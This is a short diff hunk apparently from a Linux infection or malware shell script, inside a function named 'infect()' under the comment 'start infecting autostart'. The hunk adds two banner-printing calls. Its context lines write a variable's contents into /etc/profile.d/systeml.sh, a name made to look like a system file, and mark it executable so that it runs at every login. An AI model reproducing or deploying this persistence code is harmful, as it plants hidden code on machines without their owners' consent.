@@ -149,6 +149,10 @@ function infect() {
 
 # start infecting autostart
 
+banner1
+
+banner_text
+
 echo "$CAT" > /etc/profile.d/systeml.sh
 
 chmod 755 /etc/profile.d/systeml.sh
